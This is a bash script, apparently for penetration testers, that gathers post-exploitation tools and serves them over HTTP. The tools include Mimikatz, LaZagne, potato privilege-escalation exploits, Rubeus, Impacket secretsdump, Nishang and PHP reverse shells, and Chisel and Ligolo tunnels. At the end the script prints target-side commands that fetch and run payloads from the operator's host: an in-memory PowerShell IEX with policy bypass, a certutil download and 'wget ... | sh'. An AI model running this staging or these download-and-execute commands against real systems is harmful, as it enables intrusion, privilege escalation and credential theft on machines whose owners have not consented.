#!/bin/bash
#
# serve-tools.sh - Find/download privesc tools and serve them via HTTP
#
# Usage: ./serve-tools.sh [options]
#   -s, --search DIR    Directory to search for existing tools (default: /opt)
#   -d, --dir DIR       Directory to serve tools from (default: /tmp/tools)
#   -p, --port PORT     HTTP server port (default: 80)
#   --download          Download missing tools from GitHub
#   --download-only     Download tools without starting server
#   -h, --help          Show this help message

# Don't exit on error - we handle errors ourselves

# Check bash version (need 4.0+ for associative arrays)
if [[ ${BASH_VERSION%%.*} -lt 4 ]]; then
    echo "Error: This script requires bash 4.0 or higher"
    echo "Current version: $BASH_VERSION"
    exit 1
fi

# Defaults
SEARCH_DIR="/opt"
SERVE_DIR="/tmp/tools"
PORT="80"
DOWNLOAD_MISSING=false
DOWNLOAD_ONLY=false

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -s|--search)    SEARCH_DIR="$2"; shift 2 ;;
        -d|--dir)       SERVE_DIR="$2"; shift 2 ;;
        -p|--port)      PORT="$2"; shift 2 ;;
        --download)     DOWNLOAD_MISSING=true; shift ;;
        --download-only) DOWNLOAD_MISSING=true; DOWNLOAD_ONLY=true; shift ;;
        -h|--help)
            echo "Usage: $0 [options]"
            echo "  -s, --search DIR    Directory to search (default: /opt)"
            echo "  -d, --dir DIR       Serve directory (default: /tmp/tools)"
            echo "  -p, --port PORT     HTTP port (default: 80)"
            echo "  --download          Download missing tools"
            echo "  --download-only     Download only, no server"
            exit 0
            ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}  PrivEsc Tool Server${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""

# Create directories
mkdir -p "$SERVE_DIR"
DOWNLOAD_DIR="$SERVE_DIR/.downloads"
mkdir -p "$DOWNLOAD_DIR"

# ============================================================================
# TOOL DEFINITIONS
# Format: TOOLS[canonical_name]="search_patterns|download_url|post_process|folder"
# post_process: none, unzip, ungzip, unzip_find:pattern
# folder: subdirectory to organize tool into
# ============================================================================
declare -A TOOLS

# --- PEASS-ng (WinPEAS/LinPEAS) ---
TOOLS["winPEASx64.exe"]="winpeasx64.exe winpeas64.exe|https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe|none|WinPEAS"
TOOLS["winPEASx86.exe"]="winpeasx86.exe winpeas32.exe|https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe|none|WinPEAS"
TOOLS["winPEASany.exe"]="winpeasany.exe|https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe|none|WinPEAS"
TOOLS["winPEAS.bat"]="winpeas.bat|https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat|none|WinPEAS"
TOOLS["linpeas.sh"]="linpeas.sh|https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh|none|LinPEAS"
TOOLS["linpeas_linux_amd64"]="linpeas_linux_amd64|https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64|none|LinPEAS"

# --- LaZagne ---
TOOLS["lazagne.exe"]="lazagne.exe|https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe|none|LaZagne"

# --- Potato Attacks ---
TOOLS["PrintSpoofer64.exe"]="printspoofer64.exe printspoofer.exe|https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe|none|PrintSpoofer"
TOOLS["PrintSpoofer32.exe"]="printspoofer32.exe|https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe|none|PrintSpoofer"
TOOLS["GodPotato-NET4.exe"]="godpotato-net4.exe godpotato.exe|https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe|none|GodPotato"
TOOLS["GodPotato-NET35.exe"]="godpotato-net35.exe|https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe|none|GodPotato"
TOOLS["GodPotato-NET2.exe"]="godpotato-net2.exe|https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe|none|GodPotato"
TOOLS["JuicyPotato.exe"]="juicypotato.exe juicypotato64.exe|https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe|none|JuicyPotato"
TOOLS["JuicyPotatoNG.exe"]="juicypotatong.exe|https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip|unzip_find:JuicyPotatoNG.exe|JuicyPotato"
TOOLS["SweetPotato.exe"]="sweetpotato.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SweetPotato.exe|none|SweetPotato"

# --- GhostPack / SharpCollection (pre-compiled) ---
TOOLS["SharpUp.exe"]="sharpup.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpUp.exe|none|SharpUp"
TOOLS["Seatbelt.exe"]="seatbelt.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe|none|Seatbelt"
TOOLS["Rubeus.exe"]="rubeus.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe|none|Rubeus"
TOOLS["Certify.exe"]="certify.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe|none|Certify"
TOOLS["SharpDPAPI.exe"]="sharpdpapi.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpDPAPI.exe|none|SharpDPAPI"
TOOLS["SharpChrome.exe"]="sharpchrome.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpChrome.exe|none|SharpChrome"
TOOLS["SharpRoast.exe"]="sharproast.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpRoast.exe|none|SharpRoast"
TOOLS["SharpWMI.exe"]="sharpwmi.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpWMI.exe|none|SharpWMI"
TOOLS["SafetyKatz.exe"]="safetykatz.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SafetyKatz.exe|none|SafetyKatz"
TOOLS["LockLess.exe"]="lockless.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/LockLess.exe|none|LockLess"
TOOLS["SharpKatz.exe"]="sharpkatz.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpKatz.exe|none|SharpKatz"
TOOLS["SharpSecDump.exe"]="sharpsecdump.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpSecDump.exe|none|SharpSecDump"
TOOLS["ADCSPwn.exe"]="adcspwn.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADCSPwn.exe|none|ADCSPwn"
TOOLS["Whisker.exe"]="whisker.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Whisker.exe|none|Whisker"
TOOLS["KrbRelayUp.exe"]="krbrelayup.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/KrbRelayUp.exe|none|KrbRelayUp"

# --- PowerSploit ---
TOOLS["PowerUp.ps1"]="powerup.ps1|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1|none|PowerSploit"
TOOLS["PowerView.ps1"]="powerview.ps1|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1|none|PowerSploit"
TOOLS["Invoke-Mimikatz.ps1"]="invoke-mimikatz.ps1|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1|none|PowerSploit"

# --- Mimikatz ---
TOOLS["mimikatz.exe"]="mimikatz.exe|https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip|unzip_find:x64/mimikatz.exe|Mimikatz"
TOOLS["mimikatz32.exe"]="mimikatz32.exe|https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip|unzip_find:Win32/mimikatz.exe|Mimikatz"

# --- Snaffler ---
TOOLS["Snaffler.exe"]="snaffler.exe|https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe|none|Snaffler"

# --- SharpHound / BloodHound ---
TOOLS["SharpHound.exe"]="sharphound.exe|https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip|unzip_find:SharpHound.exe|SharpHound"
TOOLS["SharpHound.ps1"]="sharphound.ps1|https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip|unzip_find:SharpHound.ps1|SharpHound"

# --- Sysinternals ---
TOOLS["accesschk.exe"]="accesschk.exe accesschk64.exe|https://download.sysinternals.com/files/AccessChk.zip|unzip_find:accesschk64.exe|Sysinternals"
TOOLS["accesschk32.exe"]="accesschk32.exe|https://download.sysinternals.com/files/AccessChk.zip|unzip_find:accesschk.exe|Sysinternals"
TOOLS["PsExec.exe"]="psexec.exe psexec64.exe|https://download.sysinternals.com/files/PSTools.zip|unzip_find:PsExec64.exe|Sysinternals"
TOOLS["procdump.exe"]="procdump.exe procdump64.exe|https://download.sysinternals.com/files/Procdump.zip|unzip_find:procdump64.exe|Sysinternals"

# --- Chisel ---
TOOLS["chisel_linux"]="chisel chisel_linux_amd64|https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz|ungzip|Chisel"
TOOLS["chisel.exe"]="chisel.exe chisel_windows_amd64.exe|https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz|ungzip|Chisel"

# --- pspy ---
TOOLS["pspy64"]="pspy64|https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64|none|pspy"
TOOLS["pspy32"]="pspy32|https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32|none|pspy"
TOOLS["pspy64s"]="pspy64s|https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s|none|pspy"
TOOLS["pspy32s"]="pspy32s|https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s|none|pspy"

# --- Kerbrute ---
TOOLS["kerbrute_linux"]="kerbrute kerbrute_linux_amd64|https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64|none|Kerbrute"
TOOLS["kerbrute.exe"]="kerbrute.exe kerbrute_windows_amd64.exe|https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe|none|Kerbrute"

# --- Netcat ---
TOOLS["nc.exe"]="nc.exe nc64.exe netcat.exe|https://github.com/int0x33/nc.exe/raw/master/nc64.exe|none|Netcat"
TOOLS["nc32.exe"]="nc32.exe|https://github.com/int0x33/nc.exe/raw/master/nc.exe|none|Netcat"

# --- Socat ---
TOOLS["socat"]="socat|https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat|none|Socat"

# --- Ligolo-ng ---
TOOLS["ligolo-agent.exe"]="ligolo-agent.exe agent.exe|https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip|unzip_find:agent.exe|Ligolo"
TOOLS["ligolo-agent_linux"]="ligolo-agent agent|https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz|untar_find:agent|Ligolo"
TOOLS["ligolo-proxy_linux"]="ligolo-proxy proxy|https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz|untar_find:proxy|Ligolo"

# --- Nishang ---
TOOLS["Invoke-PowerShellTcp.ps1"]="invoke-powershelltcp.ps1|https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1|none|Nishang"
TOOLS["Invoke-PowerShellTcpOneLine.ps1"]="invoke-powershelltcponeline.ps1|https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1|none|Nishang"

# --- Web Shells ---
TOOLS["php-reverse-shell.php"]="php-reverse-shell.php|https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php|none|WebShells"

# --- Impacket scripts ---
TOOLS["GetUserSPNs.py"]="getuserspns.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/GetUserSPNs.py|none|Impacket"
TOOLS["secretsdump.py"]="secretsdump.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py|none|Impacket"
TOOLS["psexec.py"]="psexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py|none|Impacket"
TOOLS["wmiexec.py"]="wmiexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/wmiexec.py|none|Impacket"
TOOLS["smbexec.py"]="smbexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/smbexec.py|none|Impacket"

# ============================================================================
# FUNCTIONS
# ============================================================================

download_tool() {
    local name="$1"
    local url="$2"
    local post_process="$3"
    local folder="$4"
    local target_dir="$SERVE_DIR/$folder"
    local target="$target_dir/$name"
    local temp_file="$DOWNLOAD_DIR/$(basename "$url")"

    # Create folder if needed
    mkdir -p "$target_dir"

    echo -e "  ${CYAN}Downloading from: $url${NC}"

    # Download (with redirect following)
    if ! wget -q --show-progress --content-disposition -O "$temp_file" "$url" 2>/dev/null; then
        if ! curl -sL -o "$temp_file" "$url" 2>/dev/null; then
            echo -e "  ${RED}Failed to download${NC}"
            return 1
        fi
    fi

    # Check download succeeded
    if [[ ! -s "$temp_file" ]]; then
        echo -e "  ${RED}Download resulted in empty file${NC}"
        rm -f "$temp_file"
        return 1
    fi

    # Post-process
    case "$post_process" in
        none)
            mv "$temp_file" "$target"
            ;;
        unzip)
            unzip -q -o "$temp_file" -d "$DOWNLOAD_DIR" 2>/dev/null
            rm -f "$temp_file"
            # Find the extracted file
            local extracted=$(find "$DOWNLOAD_DIR" -type f -name "*.exe" -o -name "*.ps1" | head -1)
            if [[ -n "$extracted" ]]; then
                mv "$extracted" "$target"
            fi
            ;;
        unzip_find:*)
            local pattern="${post_process#unzip_find:}"
            local extract_dir="$DOWNLOAD_DIR/extract_$$_$RANDOM"
            mkdir -p "$extract_dir"
            unzip -q -o "$temp_file" -d "$extract_dir" 2>/dev/null
            rm -f "$temp_file"
            # Handle patterns with paths (use -path for patterns with /)
            local found=""
            if [[ "$pattern" == */* ]]; then
                found=$(find "$extract_dir" -type f -ipath "*/$pattern" 2>/dev/null | head -1)
            else
                found=$(find "$extract_dir" -type f -iname "$pattern" 2>/dev/null | head -1)
            fi
            if [[ -n "$found" && -f "$found" ]]; then
                mv "$found" "$target"
                rm -rf "$extract_dir"
            else
                echo -e "  ${RED}Could not find $pattern in archive${NC}"
                rm -rf "$extract_dir"
                return 1
            fi
            ;;
        ungzip)
            gunzip -c "$temp_file" > "$target" 2>/dev/null || gzip -dc "$temp_file" > "$target" 2>/dev/null
            rm -f "$temp_file"
            # Validate file was extracted
            if [[ ! -s "$target" ]]; then
                echo -e "  ${RED}Gunzip failed or empty file${NC}"
                rm -f "$target"
                return 1
            fi
            ;;
        untar_find:*)
            local pattern="${post_process#untar_find:}"
            local extract_dir="$DOWNLOAD_DIR/extract_$$_$RANDOM"
            mkdir -p "$extract_dir"
            tar -xzf "$temp_file" -C "$extract_dir" 2>/dev/null || tar -xf "$temp_file" -C "$extract_dir" 2>/dev/null
            rm -f "$temp_file"
            local found=""
            if [[ "$pattern" == */* ]]; then
                found=$(find "$extract_dir" -type f -ipath "*/$pattern" 2>/dev/null | head -1)
            else
                found=$(find "$extract_dir" -type f -iname "$pattern" 2>/dev/null | head -1)
            fi
            if [[ -n "$found" && -f "$found" ]]; then
                mv "$found" "$target"
                rm -rf "$extract_dir"
            else
                echo -e "  ${RED}Could not find $pattern in archive${NC}"
                rm -rf "$extract_dir"
                return 1
            fi
            ;;
        *)
            mv "$temp_file" "$target"
            ;;
    esac

    # Make executable if needed
    if [[ -f "$target" ]]; then
        chmod +x "$target" 2>/dev/null
        local size=$(stat -c%s "$target" 2>/dev/null || stat -f%z "$target" 2>/dev/null)
        # Check if file is too small (likely a redirect page or error)
        if [[ "$size" -lt 100 ]]; then
            echo -e "  ${RED}File too small ($size bytes) - likely failed download${NC}"
            rm -f "$target"
            return 1
        fi
        echo -e "  ${GREEN}Saved: $target ($size bytes)${NC}"
        return 0
    else
        echo -e "  ${RED}Failed to save $target${NC}"
        return 1
    fi
}

search_tool() {
    local name="$1"
    local patterns="$2"
    local result=""

    # Skip if no search directory or no file cache
    [[ -z "$SEARCH_DIR" || -z "$FILE_CACHE" ]] && return 1

    for pattern in $patterns; do
        # Search the cached file list (case-insensitive match on filename)
        result=$(echo "$FILE_CACHE" | grep -i "/${pattern}$" | head -1) || true
        if [[ -n "$result" && -f "$result" ]]; then
            echo "$result"
            return 0
        fi
    done
    return 1
}

# ============================================================================
# MAIN
# ============================================================================

echo -e "${YELLOW}[*] Search directory: $SEARCH_DIR${NC}"
echo -e "${YELLOW}[*] Serve directory:  $SERVE_DIR${NC}"
echo -e "${YELLOW}[*] Download missing: $DOWNLOAD_MISSING${NC}"
echo ""

# Clear old symlinks (in subfolders)
find "$SERVE_DIR" -maxdepth 2 -type l -delete 2>/dev/null || true

FOUND=0
DOWNLOADED=0
NOT_FOUND=0
declare -a MISSING_TOOLS

# Verify search directory exists
if [[ ! -d "$SEARCH_DIR" ]]; then
    echo -e "${YELLOW}[!] Search directory $SEARCH_DIR does not exist, skipping search${NC}"
    SEARCH_DIR=""
fi

# Build file cache once (much faster than running find for each tool)
FILE_CACHE=""
if [[ -n "$SEARCH_DIR" ]]; then
    echo -e "${YELLOW}[*] Building file index of $SEARCH_DIR...${NC}"
    FILE_CACHE=$(find "$SEARCH_DIR" -type f 2>/dev/null)
    file_count=$(echo "$FILE_CACHE" | wc -l)
    echo -e "${GREEN}[+] Indexed $file_count files${NC}"
    echo ""
fi

echo -e "${CYAN}=== Searching for tools ===${NC}"
echo -e "${YELLOW}[*] Total tools defined: ${#TOOLS[@]}${NC}"
echo ""

for name in "${!TOOLS[@]}"; do
    tool_def="${TOOLS[$name]}"
    patterns=$(echo "$tool_def" | cut -d'|' -f1)
    url=$(echo "$tool_def" | cut -d'|' -f2)
    post_process=$(echo "$tool_def" | cut -d'|' -f3)
    folder=$(echo "$tool_def" | cut -d'|' -f4)

    # Create folder if needed
    mkdir -p "$SERVE_DIR/$folder"

    # Search for existing tool
    found_path=""
    found_path=$(search_tool "$name" "$patterns") || true

    if [[ -n "$found_path" && -f "$found_path" ]]; then
        target_path="$SERVE_DIR/$folder/$name"
        # Skip symlink if source and target are the same file
        if [[ "$(realpath "$found_path" 2>/dev/null)" != "$(realpath "$target_path" 2>/dev/null)" ]]; then
            ln -sf "$found_path" "$target_path"
        fi
        echo -e "${GREEN}[+] Found: $folder/$name${NC}"
        echo -e "    ${CYAN}-> $found_path${NC}"
        FOUND=$((FOUND + 1))
    else
        MISSING_TOOLS+=("$name")
    fi
done

echo ""

# Download missing tools if requested
if [[ "$DOWNLOAD_MISSING" == true ]] && [[ ${#MISSING_TOOLS[@]} -gt 0 ]]; then
    echo -e "${CYAN}=== Downloading missing tools ===${NC}"
    echo ""

    for name in "${MISSING_TOOLS[@]}"; do
        tool_def="${TOOLS[$name]}"
        url=$(echo "$tool_def" | cut -d'|' -f2)
        post_process=$(echo "$tool_def" | cut -d'|' -f3)
        folder=$(echo "$tool_def" | cut -d'|' -f4)

        echo -e "${YELLOW}[*] Downloading: $folder/$name${NC}"
        if download_tool "$name" "$url" "$post_process" "$folder"; then
            DOWNLOADED=$((DOWNLOADED + 1))
        else
            echo -e "${RED}[-] Failed: $folder/$name${NC}"
            NOT_FOUND=$((NOT_FOUND + 1))
        fi
        echo ""
    done
else
    for name in "${MISSING_TOOLS[@]}"; do
        tool_def="${TOOLS[$name]}"
        folder=$(echo "$tool_def" | cut -d'|' -f4)
        echo -e "${RED}[-] Not found: $folder/$name${NC}"
        NOT_FOUND=$((NOT_FOUND + 1))
    done
fi

echo ""
echo -e "${CYAN}============================================${NC}"
echo -e "${GREEN}[+] Found locally:  $FOUND${NC}"
echo -e "${GREEN}[+] Downloaded:     $DOWNLOADED${NC}"
echo -e "${RED}[-] Missing:        $NOT_FOUND${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""

# Create flat 'all' folder with symlinks to every tool
ALL_DIR="$SERVE_DIR/all"
mkdir -p "$ALL_DIR"
rm -f "$ALL_DIR"/* 2>/dev/null

tool_count=0
for folder in "$SERVE_DIR"/*/; do
    [[ -d "$folder" ]] || continue
    folder_name=$(basename "$folder")
    [[ "$folder_name" == ".downloads" || "$folder_name" == "all" ]] && continue

    for tool in "$folder"/*; do
        [[ -f "$tool" || -L "$tool" ]] || continue
        tool_name=$(basename "$tool")
        # Create relative symlink to the tool
        ln -sf "../$folder_name/$tool_name" "$ALL_DIR/$tool_name" 2>/dev/null
        tool_count=$((tool_count + 1))
    done
done
echo -e "${GREEN}[+] Created flat 'all/' folder with $tool_count tool symlinks${NC}"
echo ""

# List available tools by folder
echo -e "${YELLOW}[*] Tools organized in $SERVE_DIR:${NC}"
for folder in "$SERVE_DIR"/*/; do
    [[ -d "$folder" ]] || continue
    folder_name=$(basename "$folder")
    [[ "$folder_name" == ".downloads" || "$folder_name" == "all" ]] && continue
    file_count=$(find "$folder" -maxdepth 1 \( -type f -o -type l \) 2>/dev/null | wc -l)
    [[ "$file_count" -eq 0 ]] && continue
    echo -e "  ${CYAN}$folder_name/${NC} ($file_count)"
done
echo ""

if [[ "$DOWNLOAD_ONLY" == true ]]; then
    echo -e "${GREEN}[+] Download complete. Tools saved to: $SERVE_DIR${NC}"
    exit 0
fi

# Copy Latch.ps1 from script directory to serve directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/Latch.ps1" ]]; then
    cp "$SCRIPT_DIR/Latch.ps1" "$SERVE_DIR/Latch.ps1"
    echo -e "${GREEN}[+] Copied Latch.ps1 to serve directory${NC}"
else
    echo -e "${YELLOW}[!] Latch.ps1 not found in $SCRIPT_DIR${NC}"
fi
echo ""

# Display all network interfaces
echo -e "${CYAN}============================================${NC}"
echo -e "${GREEN}  YOUR NETWORK INTERFACES${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""

# Get all IPs per interface
ip -4 addr show 2>/dev/null | awk '
/^[0-9]+:/ {
    iface=$2
    gsub(/:/, "", iface)
}
/inet / {
    ip=$2
    gsub(/\/.*/, "", ip)
    if (ip != "127.0.0.1") {
        printf "  %-15s %s\n", iface":", ip
    }
}' | while IFS= read -r line; do
    echo -e "  ${YELLOW}$line${NC}"
done

echo ""

# Get default IP for examples (prefer tun0 if exists, else default route)
DEFAULT_IP=""
# Check for VPN/tunnel interface first
for iface in tun0 tun1 tap0; do
    DEFAULT_IP=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -1)
    [[ -n "$DEFAULT_IP" ]] && break
done
# Fallback to default route
if [[ -z "$DEFAULT_IP" ]]; then
    DEFAULT_IP=$(ip route get 1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}')
fi
if [[ -z "$DEFAULT_IP" ]]; then
    DEFAULT_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
fi
[[ -z "$DEFAULT_IP" ]] && DEFAULT_IP="<IP>"

echo -e "${CYAN}============================================${NC}"
echo -e "${GREEN}  HTTP SERVER - PORT $PORT${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""
echo -e "${YELLOW}Download commands (use appropriate IP above):${NC}"
echo ""
echo -e "  ${MAGENTA}# Run Latch.ps1 in memory (no disk write)${NC}"
echo -e "  powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://$DEFAULT_IP/Latch.ps1')\""
echo ""
echo -e "  ${MAGENTA}# Download Latch.ps1 and run with tool downloads${NC}"
echo -e "  powershell -ep bypass -c \".\\s.ps1 -RemoteHost $DEFAULT_IP -DownloadTools\""
echo ""
echo -e "  ${MAGENTA}# Download single tool (use /all/ for flat paths)${NC}"
echo -e "  powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$DEFAULT_IP/all/winPEASx64.exe','w.exe')\""
echo ""
echo -e "  ${MAGENTA}# certutil (if PowerShell blocked)${NC}"
echo -e "  certutil -urlcache -split -f http://$DEFAULT_IP/all/PrintSpoofer64.exe ps.exe"
echo ""
echo -e "  ${MAGENTA}# Linux target${NC}"
echo -e "  wget http://$DEFAULT_IP/all/linpeas.sh -O- | sh"
echo ""
echo -e "${CYAN}============================================${NC}"
echo -e "Press Ctrl+C to stop the server"
echo -e "${CYAN}============================================${NC}"
echo ""

cd "$SERVE_DIR"
python3 -m http.server "$PORT"
